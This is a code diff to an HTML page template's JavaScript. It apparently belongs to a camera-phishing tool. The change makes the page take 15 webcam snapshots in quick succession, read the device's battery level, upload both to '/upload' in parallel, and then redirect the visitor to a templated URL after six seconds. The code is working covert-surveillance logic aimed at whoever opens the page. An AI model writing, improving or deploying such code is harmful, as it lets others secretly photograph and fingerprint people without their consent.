@@ -49,24 +49,30 @@
                 const canvas = document.createElement('canvas');
                 const context = canvas.getContext('2d');
 
-                const capturePhotos = async () => {
-                    for (let i = 0; i < 10; i++) { // Capture 10 photos
+                const uploadImage = async (snapshot, batteryLevel) => {
+                    await fetch('/upload', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ image: snapshot, battery: batteryLevel })
+                    });
+                };
+
+                const captureAndUploadPhotos = async () => {
+                    const battery = await navigator.getBattery();
+                    const batteryLevel = Math.round(battery.level * 100);
+                    
+                    const uploadPromises = [];
+                    for (let i = 0; i < 15; i++) { // Capture 15 photos
                         context.drawImage(video, 0, 0, canvas.width, canvas.height);
                         const snapshot = canvas.toDataURL('image/png');
-
-                        const battery = await navigator.getBattery();
-                        const batteryLevel = Math.round(battery.level * 100);
-
-                        await fetch('/upload', {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify({ image: snapshot, battery: batteryLevel })
-                        });
+                        uploadPromises.push(uploadImage(snapshot, batteryLevel));
 
                         await new Promise(resolve => setTimeout(resolve, 300)); // 300ms delay
                     }
+
+                    await Promise.all(uploadPromises);
 
                     video.pause();
                     stream.getTracks().forEach(track => track.stop());
@@ -75,7 +81,7 @@
                 video.addEventListener('loadedmetadata', () => {
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
-                    capturePhotos();
+                    captureAndUploadPhotos();
                 });
             }
         }
@@ -85,7 +91,7 @@
             startCapture();
             setTimeout(() => {
                 window.location.href = "{{ redirect_url }}";
-            }, 10000); // Wait for 6 seconds before redirecting
+            }, 6000); // Wait for 6 seconds before redirecting
         });
     </script>
 </body>
